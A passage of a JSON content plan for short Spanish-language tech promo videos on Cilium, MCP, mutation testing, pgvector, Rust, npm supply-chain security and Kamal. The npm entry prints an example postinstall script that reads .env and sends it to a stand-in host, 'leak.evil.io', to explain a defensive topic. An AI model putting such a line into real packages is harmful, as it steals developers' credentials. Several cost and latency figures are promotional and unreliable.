            "title": "CILIUM eBPF EN PRODUCCIÓN",
            "leftTitle": "CONSUMO DE RECURSOS",
            "rightTitle": "MÉTRICAS CLAVE",
            "leftText": "ISTIO PROXIES: 24% CPU | 1.8 ms delay\nCILIUM eBPF:   2% CPU  | 0.2 ms delay\n✔ Ahorro de RAM: 3.2 GB por nodo",
            "rightText": "• Reduce el gasto en clusters un 35%\n• Desaparecen los errores de timeout\n• Observabilidad nativa con Hubble\n• Contacto para asesoría en mi perfil"
          }
        }
      ]
    }
  },
  {
    "key": "05_A",
    "topicNum": "05",
    "group": "05. MCP AGENT HARNESS",
    "label": "Var A (Técnico): Model Context Protocol (MCP): El estándar universal para IA y código",
    "variation": "A (Técnico)",
    "category": "INTELIGENCIA ARTIFICIAL",
    "manifest": {
      "title": "[05] Model Context Protocol (MCP): El estándar universal para IA y código (Var A)",
      "category": "INTELIGENCIA ARTIFICIAL",
      "slug": "05_mcp_agent_harness",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "mcp_lead",
          "type": "quantization_weights_viz",
          "duration": 6,
          "voiceover": "Olvídate de pegar código a mano en el chat. Model Context Protocol es el estándar abierto que conecta modelos de IA con bases de datos, APIs y herramientas locales.",
          "visual_cue": "Visualizador del protocolo MCP conectando el harness de agentes con herramientas del entorno",
          "props": {
            "mode": "mcp",
            "badge": "ESTÁNDAR UNIVERSAL",
            "title": "MODEL CONTEXT PROTOCOL (MCP)",
            "subtitle": "COMUNICACIÓN TIPADA CLIENTE-SERVIDOR PARA AGENTES"
          }
        },
        {
          "id": "flow_mcp",
          "type": "architecture_flow",
          "duration": 6,
          "voiceover": "Funciona como un Language Server Protocol: el modelo solicita herramientas y el servidor MCP ejecuta la acción de forma segura en tu máquina.",
          "visual_cue": "Flujo de comunicación entre Claude / GPT, el arnés de MCP y las herramientas locales",
          "props": {
            "header": "CONTRATO DE HERRAMIENTAS",
            "title": "ARQUITECTURA CLIENTE - SERVIDOR MCP",
            "nodes": [
              {
                "id": "llm",
                "label": "MODELO DE IA (LLM)",
                "sublabel": "Claude · GPT-4 · DeepSeek",
                "color": "#a855f7",
                "y": 160
              },
              {
                "id": "client",
                "label": "MCP CLIENT (ARNÉS)",
                "sublabel": "Validación de JSON-Schema y permisos",
                "color": "#38bdf8",
                "y": 520
              },
              {
                "id": "servers",
                "label": "MCP SERVERS LOCALES",
                "sublabel": "Postgres · Terminal · Git · FileSystem",
                "color": "#10b981",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "terminal_mcp",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Esto convierte a los modelos en agentes autónomos reales con límites de seguridad estrictos. Link en bio si quieres integrar IA en tu software de producción.",
          "visual_cue": "Terminal mostrando ejecución de herramienta MCP con validación estricta de esquema",
          "props": {
            "header": "DESARROLLO DE AGENTES (Link en bio)",
            "title": "AGENTES DETERMINISTAS",
            "leftTitle": "TRAZA JSON-RPC",
            "rightTitle": "BENEFICIOS DE MCP",
            "leftText": "--> tools/call {\"name\": \"query_db\", \"sql\": \"...\"}\n<-- tools/result {\"rows\": 4, \"time_ms\": 1.2}\n✔ Schema validado con Zod / JSON-Schema",
            "rightText": "• Sin wrappers propietarios frágiles\n• Conecta cualquier modelo a tus datos\n• Ejecución local 100% segura\n• Construye agentes serios: link en bio"
          }
        }
      ]
    }
  },
  {
    "key": "05_B",
    "topicNum": "05",
    "group": "05. MCP AGENT HARNESS",
    "label": "Var B (Polémico): El \"Prompting\" ha muerto: Por qué la industria se mudó a los arneses de IA",
    "variation": "B (Polémico)",
    "category": "INTELIGENCIA ARTIFICIAL",
    "manifest": {
      "title": "[05] El \"Prompting\" ha muerto: Por qué la industria se mudó a los arneses de IA (Var B)",
      "category": "INTELIGENCIA ARTIFICIAL",
      "slug": "05_mcp_agent_harness",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "harness_diagram",
          "type": "quantization_weights_viz",
          "duration": 6,
          "voiceover": "Intentar que una IA programe escribiéndole biblias de texto es una pérdida de tiempo. Los equipos serios usan arneses deterministas con MCP.",
          "visual_cue": "Visualizador del harness de ingeniería conectando IA con herramientas estructuradas",
          "props": {
            "mode": "mcp",
            "badge": "INGENIERÍA VS PROMPTING",
            "title": "EL FIN DEL PROMPTING INFORMAL",
            "subtitle": "HERRAMIENTAS ESTRUCTURADAS Y CONTRATOS ESTRICTOS"
          }
        },
        {
          "id": "terminal_eval",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "El arnés compila, corre los tests, lee los errores y le devuelve al modelo exactamente lo que necesita arreglar. Link en mi perfil para consultoría de IA.",
          "visual_cue": "Terminal mostrando ciclo autónomo: código -> test fallido -> mutación -> test verde",
          "props": {
            "header": "CONSULTORÍA EN IA (Link en bio)",
            "title": "LOOP AUTÓNOMO DE VERIFICACIÓN",
            "leftTitle": "EJECUCIÓN DEL ARNÉS",
            "rightTitle": "RESULTADO DE CÓDIGO",
            "leftText": "$ agent-harness run-task\n✔ Generando parche de código...\n✖ npm test falló: TypeError en auth.ts:42\n✔ Reintentando con contexto del error\n✔ npm test pasó al 100% (Green)",
            "rightText": "• Cero alucinaciones sin verificar\n• Parches validados por tests antes de merge\n• Automatización real para equipos de software\n• Agenda tu sesión: enlace en mi perfil"
          }
        }
      ]
    }
  },
  {
    "key": "06_A",
    "topicNum": "06",
    "group": "06. VERIFICACION VS VIBE CODING",
    "label": "Var A (Técnico): Mutation & Property-Based Testing: Verificando código de IA",
    "variation": "A (Técnico)",
    "category": "CALIDAD DE SOFTWARE & TESTING",
    "manifest": {
      "title": "[06] Mutation & Property-Based Testing: Verificando código de IA (Var A)",
      "category": "CALIDAD DE SOFTWARE & TESTING",
      "slug": "06_verificacion_vs_vibe_coding",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "mutation_terminal_hook",
          "type": "code_terminal",
          "duration": 6.5,
          "voiceover": "Generar código con IA es instantáneo; verificar que no destruya producción a las tres de la madrugada es el verdadero reto de ingeniería.",
          "visual_cue": "Apertura directa con terminal ejecutando mutaciones de prueba sobre el código",
          "props": {
            "header": "MUTATION TESTING EN CI",
            "title": "STRYKER MUTATION ENGINE",
            "filename": "tests/mutation.log",
            "codeLines": [
              "stryker run --concurrency=8",
              "Inyectando mutación: reemplazado \">=\" por \">\" en auth.ts:42",
              "Ejecutando suite de pruebas contra mutante #104...",
              "FALLO: El mutante sobrevivió sin ser detectado",
              "Score de mutación: 68% · Requiere assertions más estrictos"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "property_testing",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "En vez de probar tres casos aislados, los tests basados en propiedades generan diez mil combinaciones de datos aleatorios para romper tu lógica.",
          "visual_cue": "Matriz comparando Unit Tests manuales vs Property-Based Testing",
          "props": {
            "header": "MÉTODOS DE COMPROBACIÓN",
            "title": "UNIT TESTS VS PROPERTY TESTING",
            "colA": "PROPERTY-BASED TESTING",
            "colB": "TESTS MANUALES BÁSICOS",
            "rows": [
              {
                "dim": "Entradas probadas",
                "a": "10.000 generadas por run",
                "b": "3 o 4 ejemplos fijos",
                "aGood": true
              },
              {
                "dim": "Casos límite ocultos",
                "a": "Detecta desbordamientos",
                "b": "Ignora casos extremos",
                "aGood": true
              },
              {
                "dim": "Resistencia a mutantes",
                "a": "Alta cobertura real",
                "b": "Falso 100% de coverage",
                "aGood": true
              }
            ]
          }
        },
        {
          "id": "cta_testing",
          "type": "terminal_split",
          "duration": 5,
          "voiceover": "Audito suites de prueba y diseño pipelines de verificación determinista para equipos de desarrollo. Link en mi perfil para agendar una sesión.",
          "visual_cue": "Terminal con informe de calidad de software y llamada a la acción",
          "props": {
            "header": "AUDITORÍA DE CALIDAD (Link en bio)",
            "title": "BLINDA TU SOFTWARE EN PRODUCCIÓN",
            "leftTitle": "INSPECCIÓN DE TEST SUITE",
            "rightTitle": "MÉTRICAS CLAVE",
            "leftText": "$ npx stryker run --reporters html\n✔ Mutantes ejecutados: 482\n✔ Mutantes eliminados: 479 (99.3% score)\n✔ 0 falsos positivos en CI/CD",
            "rightText": "• Detecta bugs antes de desplegar a usuarios\n• Pruebas automáticas con datos extremos\n• Verifica código autogenerado por IA\n• Agenda sesión: enlace en el perfil"
          }
        }
      ]
    }
  },
  {
    "key": "06_B",
    "topicNum": "06",
    "group": "06. VERIFICACION VS VIBE CODING",
    "label": "Var B (Polémico): \"Vibe Coding\" es una bomba de tiempo: Por qué la deuda explotará",
    "variation": "B (Polémico)",
    "category": "CALIDAD DE SOFTWARE & TESTING",
    "manifest": {
      "title": "[06] \"Vibe Coding\" es una bomba de tiempo: Por qué la deuda explotará (Var B)",
      "category": "CALIDAD DE SOFTWARE & TESTING",
      "slug": "06_verificacion_vs_vibe_coding",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "split_vibe_vs_eng",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "El código barato de escribir es carísimo de mantener si nadie en el equipo sabe cómo depurarlo cuando colapse el servicio.",
          "visual_cue": "Doble terminal: Vibe Coder improvisando vs Ingeniero aplicando verificación",
          "props": {
            "header": "EL COSTE OCULTO",
            "title": "ILUSIÓN DE VELOCIDAD VS MANTENIMIENTO",
            "leftTitle": "EQUIPO \"VIBE CODING\"",
            "rightTitle": "INGENIERÍA RIGUROSA",
            "leftText": "$ git push --force prod\n✖ Incidencia en vivo: Memory Leak en Worker\n✖ Nadie sabe qué hace el 80% del código\n✖ Coste de depuración: 3 días de caída",
            "rightText": "$ npx test:e2e && npx typecheck\n✔ Contratos estrictos y tests de mutación\n✔ Tiempo de depuración: 4 minutos\n✔ Deuda técnica neutralizada"
          }
        },
        {
          "id": "metrics_debt",
          "type": "metrics_comparison",
          "duration": 5.5,
          "voiceover": "Aceptar sugerencias de IA a ciegas acumula deuda técnica a una velocidad récord: el tiempo de depuración se multiplica por diez.",
          "visual_cue": "Métricas comparativas de tiempo de depuración",
          "props": {
            "header": "TIEMPO DE RESOLUCIÓN DE INCIDENCIAS",
            "metricA": {
              "label": "VIBE CODING A CIEGAS",
              "value": "14.5 horas",
              "sub": "Código incomprensible sin tests",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "INGENIERÍA VERIFICADA",
              "value": "18 minutos",
              "sub": "Arquitectura tipada con límites claros",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "cta_auditoria_vibe",
          "type": "code_terminal",
          "duration": 4,
          "voiceover": "Si tu equipo tiene miedo de tocar su propio código, link en mi bio para auditar tu arquitectura y limpiar la deuda técnica acumulada.",
          "visual_cue": "Terminal con linters estrictos y llamada a la acción en bio",
          "props": {
            "header": "AUDITORÍA DE ARQUITECTURA (Link en bio)",
            "title": "REGLAS DE REFACTORIZACIÓN",
            "filename": "eslint.config.js",
            "codeLines": [
              "// Enforcing architectural boundaries:",
              "export default [",
              "  rules: {",
              "    \"@app/no-unverified-ai-code\": \"error\",",
              "    \"@app/strict-mutation-threshold\": [\"error\", 85]",
              "  }",
              "];"
            ],
            "cursorLine": 4
          }
        }
      ]
    }
  },
  {
    "key": "07_A",
    "topicNum": "07",
    "group": "07. PGVECTOR VS VECTORDB",
    "label": "Var A (Técnico): Algoritmo HNSW en memoria: Grafos vectoriales en PostgreSQL",
    "variation": "A (Técnico)",
    "category": "BASES DE DATOS & IA",
    "manifest": {
      "title": "[07] Algoritmo HNSW en memoria: Grafos vectoriales en PostgreSQL (Var A)",
      "category": "BASES DE DATOS & IA",
      "slug": "07_pgvector_vs_vectordb",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hnsw_engine",
          "type": "storage_engine_viz",
          "duration": 6.5,
          "voiceover": "¿Cómo busca pgvector embeddings entre millones de documentos en dos milisegundos? Utiliza el algoritmo HNSW en memoria.",
          "visual_cue": "Visualizador del grafo vectorial HNSW navegable en capas en la memoria de Postgres",
          "props": {
            "mode": "hnsw",
            "badge": "ALGORITMO DE GRAFOS",
            "title": "HNSW VECTORIAL EN MEMORIA",
            "subtitle": "BÚSQUEDA POR SIMILITUD DE COSENOS EN POSTGRESQL"
          }
        },
        {
          "id": "latency_hnsw",
          "type": "latency_scale",
          "duration": 5.5,
          "voiceover": "Al estar en la misma base de datos relacional, el join entre el vector y los datos del usuario toma cero coma cinco milisegundos.",
          "visual_cue": "Escala de latencia: join in-memory en Postgres vs llamada HTTP externa a Pinecone",
          "props": {
            "header": "MÉTRICA DE LATENCIA EN IA",
            "title": "JOIN RELACIONAL VS LLAMADA EXTERNA",
            "subtitle": "CONSULTA IN-PROCESS EN POSTGRES VS API VECTORIAL"
          }
        },
        {
          "id": "cta_vectordb",
          "type": "metrics_comparison",
          "duration": 5.5,
          "voiceover": "Todo tu stack de IA cabe en Postgres con pgvector. Link en mi bio si quieres simplificar tu arquitectura y recortar costes innecesarios.",
          "visual_cue": "Comparativa de costos: Pinecone dedicado vs Postgres unificado",
          "props": {
            "header": "CONSULTORÍA EN BASES DE DATOS (Link en bio)",
            "metricA": {
              "label": "PINECONE + POSTGRES",
              "value": "$1.450 / mes",
              "sub": "Doble base de datos · Salto de red",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "PGVECTOR UNIFICADO",
              "value": "$85 / mes",
              "sub": "Transacciones ACID · Joins inmediatos",
              "color": "#10b981"
            }
          }
        }
      ]
    }
  },
  {
    "key": "07_B",
    "topicNum": "07",
    "group": "07. PGVECTOR VS VECTORDB",
    "label": "Var B (Polémico): No necesitas Pinecone: Todo tu stack de IA cabe en Postgres",
    "variation": "B (Polémico)",
    "category": "BASES DE DATOS & IA",
    "manifest": {
      "title": "[07] No necesitas Pinecone: Todo tu stack de IA cabe en Postgres (Var B)",
      "category": "BASES DE DATOS & IA",
      "slug": "07_pgvector_vs_vectordb",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "pinecone_shock",
          "type": "latency_scale",
          "duration": 5.5,
          "voiceover": "Contratar una base de datos vectorial externa solo para guardar embeddings es el mayor error de arquitectura de 2026.",
          "visual_cue": "Gráfica de latencia mostrando el salto de red de 85ms a Pinecone vs 3ms en Postgres",
          "props": {
            "header": "SOBRECARGA DE RED EN RAG",
            "title": "EL ERROR DE FRAGMENTAR TU BASE",
            "subtitle": "LATENCIA DE RED HTTP VS JOINS EN EL MISMO MOTOR"
          }
        },
        {
          "id": "hnsw_storage",
          "type": "storage_engine_viz",
          "duration": 6,
          "voiceover": "Postgres maneja tus usuarios, tus pagos y tus vectores con consistencia transaccional y backups unificados con pg_dump.",
          "visual_cue": "Visualizador del motor de almacenamiento HNSW demostrando 99% recall",
          "props": {
            "mode": "hnsw",
            "badge": "STACK UNIFICADO",
            "title": "CERO BASES DE DATOS EXTERNAS",
            "subtitle": "RELACIONAL + VECTORES EN EL MISMO CLÚSTER ACID"
          }
        }
      ]
    }
  },
  {
    "key": "08_A",
    "topicNum": "08",
    "group": "08. RUST SISTEMAS CRITICOS",
    "label": "Var A (Técnico): El Borrow Checker de Rust: Cero fugas de memoria sin GC",
    "variation": "A (Técnico)",
    "category": "LENGUAJES & RENDIMIENTO",
    "manifest": {
      "title": "[08] El Borrow Checker de Rust: Cero fugas de memoria sin GC (Var A)",
      "category": "LENGUAJES & RENDIMIENTO",
      "slug": "08_rust_sistemas_criticos",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "rust_compile_hook",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "Rust garantiza seguridad de memoria en tiempo de compilación. No hay recolector de basura deteniendo el mundo ni fugas ocultas.",
          "visual_cue": "Terminal mostrando error del borrow checker atrapando un puntero colgante antes de llegar a prod",
          "props": {
            "header": "GARANTÍA EN COMPILACIÓN",
            "title": "EL BORROW CHECKER EN ACCIÓN",
            "leftTitle": "COMPILADOR RUSTC",
            "rightTitle": "GARANTÍA DE MEMORIA",
            "leftText": "$ cargo check\nerror[E0382]: borrow of moved value: `data`\n  --> src/network.rs:42:18\n  | value moved here, in previous iteration\n✖ El compilador prohíbe data races",
            "rightText": "• 0 punteros nulos en runtime\n• 0 fugas de memoria sin recolector\n• Rendimiento idéntico a C/C++\n• Aislamiento estricto de hilos"
          }
        },
        {
          "id": "memory_inspection",
          "type": "memory_layout",
          "duration": 6,
          "voiceover": "Cada valor tiene un único dueño. Cuando la variable sale del ámbito, la memoria se libera inmediatamente en el stack sin pausas de CPU.",
          "visual_cue": "Inspección de memoria RAM mostrando asignación en stack sin fragmentación de heap",
          "props": {
            "badge": "GESTIÓN RAII",
            "title": "ASIGNACIÓN EN STACK VS HEAP",
            "rows": [
              {
                "addr": "0x7FFF010",
                "hex": [
                  "72",
                  "75",
                  "73",
                  "74",
                  "5F",
                  "6F",
                  "77",
                  "6E"
                ],
                "label": "BUFFER EXCLUSIVO (STACK)"
              },
              {
                "addr": "0x7FFF018",
                "hex": [
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "20"
                ],
                "label": "CAPACIDAD (32 BYTES)"
              },
              {
                "addr": "0x7FFF020",
                "hex": [
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00"
                ],
                "label": "LIBERACIÓN AUTOMÁTICA"
              }
            ]
          }
        },
        {
          "id": "cta_rust",
          "type": "metrics_comparison",
          "duration": 5.5,
          "voiceover": "Optimizo microservicios críticos y migro cuellos de botella a Rust para reducir la latencia p99 a microsegundos. Link en bio para auditar tu backend.",
          "visual_cue": "Comparativa de latencia de cola p99: Go con GC vs Rust nativo",
          "props": {
            "header": "CONSULTORÍA EN RUST (Link en bio)",
            "metricA": {
              "label": "GO BACKEND (GC PAUSES)",
              "value": "45.2 ms",
              "sub": "Picos de latencia en percentil p99",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "RUST NATIVO (ZERO-GC)",
              "value": "0.48 ms",
              "sub": "Latencia predecible y uniforme",
              "color": "#10b981"
            }
          }
        }
      ]
    }
  },
  {
    "key": "08_B",
    "topicNum": "08",
    "group": "08. RUST SISTEMAS CRITICOS",
    "label": "Var B (Polémico): Por qué Discord y Cloudflare mataron Go y adoptaron Rust",
    "variation": "B (Polémico)",
    "category": "LENGUAJES & RENDIMIENTO",
    "manifest": {
      "title": "[08] Por qué Discord y Cloudflare mataron Go y adoptaron Rust (Var B)",
      "category": "LENGUAJES & RENDIMIENTO",
      "slug": "08_rust_sistemas_criticos",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "memory_gc_shock",
          "type": "memory_layout",
          "duration": 6,
          "voiceover": "Discord tenía un servicio en Go procesando millones de mensajes. Cada dos minutos, el Garbage Collector congelaba el servicio creando picos de latencia inaceptables.",
          "visual_cue": "Inspección de memoria con picos de pausa de Garbage Collector en Go",
          "props": {
            "badge": "COLAPSO POR RECOLECTOR",
            "title": "EL PROBLEMA DEL GC EN ESCALA",
            "rows": [
              {
                "addr": "0xDEAD010",
                "hex": [
                  "FF",
                  "FF",
                  "FF",
                  "FF",
                  "00",
                  "00",
                  "00",
                  "00"
                ],
                "label": "OBJETOS HUÉRFANOS EN HEAP"
              },
              {
                "addr": "0xDEAD018",
                "hex": [
                  "53",
                  "54",
                  "4F",
                  "50",
                  "5F",
                  "57",
                  "4F",
                  "52"
                ],
                "label": "PAUSA STOP-THE-WORLD"
              },
              {
                "addr": "0xDEAD020",
                "hex": [
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "05",
                  "00"
                ],
                "label": "LATENCIA P99: 1200 MS"
              }
            ]
          }
        },
        {
          "id": "rust_rewrite",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Reescribieron el servicio en Rust. El uso de CPU se desplomó y la latencia pasó de dos segundos a menos de un milisegundo constante. Link en bio para optimizaciones.",
          "visual_cue": "Terminal mostrando comparativa de métricas tras la migración a Rust",
          "props": {
            "header": "OPTIMIZACIÓN DE SISTEMAS (Link en bio)",
            "title": "MIGRACIÓN DE GO A RUST",
            "leftTitle": "SERVICIO EN GO",
            "rightTitle": "SERVICIO EN RUST",
            "leftText": "CPU: 85% de saturación continua\nLatencia P99: 2.400 ms (GC Spike)\nRAM: 14 GB con fragmentación",
            "rightText": "CPU: 8% de uso estable\nLatencia P99: 0.35 ms constante\nRAM: 420 MB sin picos ni fugas"
          }
        }
      ]
    }
  },
  {
    "key": "09_A",
    "topicNum": "09",
    "group": "09. SEGURIDAD SUPPLY CHAIN",
    "label": "Var A (Técnico): Anatomía de un malware en NPM: Robo de .env en scripts postinstall",
    "variation": "A (Técnico)",
    "category": "CIBERSEGURIDAD & DEVOPS",
    "manifest": {
      "title": "[09] Anatomía de un malware en NPM: Robo de .env en scripts postinstall (Var A)",
      "category": "CIBERSEGURIDAD & DEVOPS",
      "slug": "09_seguridad_supply_chain",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "kernel_intercept_malware",
          "type": "kernel_sandbox_viz",
          "duration": 6,
          "voiceover": "Un simple npm install puede vaciar las variables de entorno de tu servidor si un paquete secuestrado ejecuta un script de postinstall con permisos de red.",
          "visual_cue": "Visualizador del kernel interceptando llamada al sistema de robo de variables .env",
          "props": {
            "badge": "DEFENSA EN PROFUNDIDAD",
            "title": "INTERCEPCIÓN DE SYSCALLS",
            "subtitle": "BLOQUEO DE LLAMADAS NO AUTORIZADAS EN POSTINSTALL"
          }
        },
        {
          "id": "exploit_code",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "El script malicioso lee tu archivo .env con las claves de AWS y Stripe y las envía codificadas en base sesenta y cuatro a un servidor en el extranjero.",
          "visual_cue": "Terminal mostrando el código ofuscado dentro del package.json de un paquete comprometido",
          "props": {
            "header": "ANATOMÍA DEL EXPLOIT",
            "title": "OFUSCACIÓN EN PACKAGE.JSON",
            "filename": "node_modules/fake-pkg/package.json",
            "codeLines": [
              "  \"scripts\": {",
              "    \"postinstall\": \"node -e 'require(\"http\").request({",
              "      hostname: \"leak.evil.io\",",
              "      path: \"/?k=\" + Buffer.from(fs.readFileSync(\".env\")).toString(\"base64\")",
              "    }).end();'\"",
              "  }"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "cta_security",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Audito pipelines de CI/CD e implemento políticas Zero-Trust para aislar procesos de build en producción. Link en mi perfil para blindar tu repositorio.",
          "visual_cue": "Terminal mostrando política de bloqueo de scripts y llamada a la acción",
          "props": {
            "header": "AUDITORÍA DE SEGURIDAD (Link en bio)",
            "title": "BLINDAJE DE PIPELINE ZERO-TRUST",
            "leftTitle": "POLÍTICA DE DEPENDENCIAS",
            "rightTitle": "MEDIDAS APLICADAS",
            "leftText": "$ npm config set ignore-scripts true\n✔ Scripts postinstall bloqueados por defecto\n✔ Detección de exfiltración de red activa\n✔ Secretos en memoria aislados con vaults",
            "rightText": "• Audita dependencias transitivas\n• Protege credenciales de AWS y Stripe\n• Cero ejecución arbitraria en builds\n• Contacto para auditoría: link en bio"
          }
        }
      ]
    }
  },
  {
    "key": "09_B",
    "topicNum": "09",
    "group": "09. SEGURIDAD SUPPLY CHAIN",
    "label": "Var B (Polémico): GitHub desactiva postinstall: Cómo blindar tu pipeline Zero-Trust",
    "variation": "B (Polémico)",
    "category": "CIBERSEGURIDAD & DEVOPS",
    "manifest": {
      "title": "[09] GitHub desactiva postinstall: Cómo blindar tu pipeline Zero-Trust (Var B)",
      "category": "CIBERSEGURIDAD & DEVOPS",
      "slug": "09_seguridad_supply_chain",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "attack_demo",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "Si tu pipeline corre npm install sin la bandera ignore-scripts, estás a un paquete comprometido de perder el control total de tu infraestructura.",
          "visual_cue": "Terminal mostrando ataque simulado y cómo la bandera ignore-scripts lo neutraliza",
          "props": {
            "header": "VECTOR DE ATAQUE EN CI/CD",
            "title": "EJECUCIÓN ARBITRARIA EN BUILD",
            "leftTitle": "PIPELINE VULNERABLE",
            "rightTitle": "PIPELINE BLINDADO",
            "leftText": "$ npm install\nRunning postinstall script...\n✖ Exfiltrando .env a servidor remoto\n✖ Credenciales comprometidas en 0.8s",
            "rightText": "$ npm ci --ignore-scripts\n✔ Postinstall ignorado por completo\n✔ 0 llamadas salientes a internet\n✔ Repositorio 100% blindado"
          }
        },
        {
          "id": "kernel_defense",
          "type": "kernel_sandbox_viz",
          "duration": 5.5,
          "voiceover": "Bloquea los scripts por defecto y aísla el entorno de build con contenedores sin acceso a internet saliente. Link en mi bio para auditar tu pipeline.",
          "visual_cue": "Visualizador del kernel impidiendo conexiones salientes no autorizadas",
          "props": {
            "badge": "ZERO-TRUST NETWORKING",
            "title": "AISLAMIENTO DE PROCESO DE BUILD",
            "subtitle": "BLOQUEO DE CONEXIONES EXTERNAS NO PERMITIDAS"
          }
        }
      ]
    }
  },
  {
    "key": "10_A",
    "topicNum": "10",
    "group": "10. EXODO BARE METAL KAMAL",
    "label": "Var A (Técnico): Kamal en Producción: Despliegue Zero-Downtime sin Kubernetes",
    "variation": "A (Técnico)",
    "category": "DEVOPS & CLOUD",
    "manifest": {
      "title": "[10] Kamal en Producción: Despliegue Zero-Downtime sin Kubernetes (Var A)",
      "category": "DEVOPS & CLOUD",
      "slug": "10_exodo_bare_metal_kamal",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "kamal_stepper_hook",
          "type": "migration_stepper_viz",
          "duration": 6.5,
          "voiceover": "No necesitas un clúster de Kubernetes de tres mil dólares para tener despliegues con cero tiempo de inactividad. Kamal lo hace con Docker en servidores económicos.",
          "visual_cue": "Visualizador de fases de despliegue rolling zero-downtime con Kamal y Traefik",
          "props": {
            "badge": "DESPLIEGUE ZERO-DOWNTIME",
            "title": "KAMAL ROLLING DEPLOY",
            "subtitle": "TRANSICIÓN DE CONTENEDORES SIN PERDER PETICIONES"
          }
        },
        {
          "id": "metrics_cost_kamal",
          "type": "metrics_comparison",
          "duration": 5.5,
          "voiceover": "Mudas tu infraestructura de AWS a servidores Hetzner de alto rendimiento y pasas de pagar miles de dólares al mes a menos de doscientos.",
          "visual_cue": "Comparativa de costos: Clúster EKS de AWS vs Servidor Hetzner con Kamal",
          "props": {
            "header": "AHORRO EN INFRAESTRUCTURA CLOUD",
            "metricA": {
              "label": "AWS EKS + NAT GATEWAYS",
              "value": "$4.850 / mes",
              "sub": "Control plane · Load Balancers · Tráfico",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "HETZNER DEDICADO + KAMAL",
              "value": "$180 / mes",
              "sub": "64 núcleos AMD · 128 GB RAM · NVMe",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "cta_kamal",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Ayudo a startups a migrar de la nube inflada a servidores dedicados con Kamal sin perder disponibilidad. Enlace en mi perfil para auditar tus servidores.",
          "visual_cue": "Terminal ejecutando kamal deploy con éxito y llamada a la acción en bio",
          "props": {
            "header": "MIGRACIÓN CLOUD (Link en bio)",
            "title": "DESPLIEGUE SENCILLO Y RENTABLE",
            "leftTitle": "KAMAL DEPLOY EN ACCIÓN",
            "rightTitle": "RESULTADO DE MIGRACIÓN",
            "leftText": "$ kamal deploy\n✔ Subiendo imagen Docker a servidor...\n✔ Iniciando nuevo contenedor en puerto 3001\n✔ Traefik redirige el tráfico (0s downtime)\n✔ Deteniendo contenedor antiguo",
            "rightText": "• Reduce el 90% de tu factura mensual\n• Control total sobre tu hardware\n• Cero dolores de cabeza con K8s\n• ¿Evaluamos tu caso? Enlace en perfil"
          }
        }
      ]
    }
  },
  {
    "key": "10_B",
    "topicNum": "10",
    "group": "10. EXODO BARE METAL KAMAL",
    "label": "Var B (Polémico): De $15.000 a $200 al mes: El éxodo de la nube a servidores Hetzner",
    "variation": "B (Polémico)",
    "category": "DEVOPS & CLOUD",
    "manifest": {
      "title": "[10] De $15.000 a $200 al mes: El éxodo de la nube a servidores Hetzner (Var B)",
      "category": "DEVOPS & CLOUD",
      "slug": "10_exodo_bare_metal_kamal",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "exodus_metrics",
          "type": "metrics_comparison",
          "duration": 6,
          "voiceover": "Las grandes nubes te cobran por cada gigabyte transferido y cada balanceador levantado. Con un servidor dedicado en Hetzner obtienes diez veces más potencia por una fracción del precio.",
          "visual_cue": "Métricas de ahorro masivo de infraestructura",
          "props": {
            "header": "EL ÉXODO DE LA NUBE EN 2026",
            "metricA": {
              "label": "FACTURA TÍPICA AWS",
              "value": "$14.800",
              "sub": "Servicios inflados y tráfico de red",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "HETZNER BARE METAL",
              "value": "$220",
              "sub": "Tráfico ilimitado · Hardware dedicado",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "kamal_rollout",
          "type": "migration_stepper_viz",
          "duration": 5.5,
          "voiceover": "Con herramientas como Kamal despliegas con un solo comando desde tu terminal manteniendo cero caídas en producción. Link en bio para auditar tu nube.",
          "visual_cue": "Visualizador del flujo de despliegue en servidor bare metal",
          "props": {
            "badge": "SIMPLICIDAD OPERATIVA",
            "title": "BARE METAL EN PRODUCCIÓN",
            "subtitle": "DOCKER + TRAEFIK ORQUESTADO POR KAMAL"
          }
        }
      ]
    }
  },
  {
    "key": "11_A",
    "topicNum": "11",
    "group": "11. MODELOS LOCALES VLLM",
    "label": "Var A (Técnico): Cómo funciona la cuantización a 4 bits: GGUF sin perder inteligencia",
    "variation": "A (Técnico)",
    "category": "AI INFRASTRUCTURE & OPEN WEIGHTS",
    "manifest": {
      "title": "[11] Cómo funciona la cuantización a 4 bits: GGUF sin perder inteligencia (Var A)",
      "category": "AI INFRASTRUCTURE & OPEN WEIGHTS",
      "slug": "11_modelos_locales_vllm",
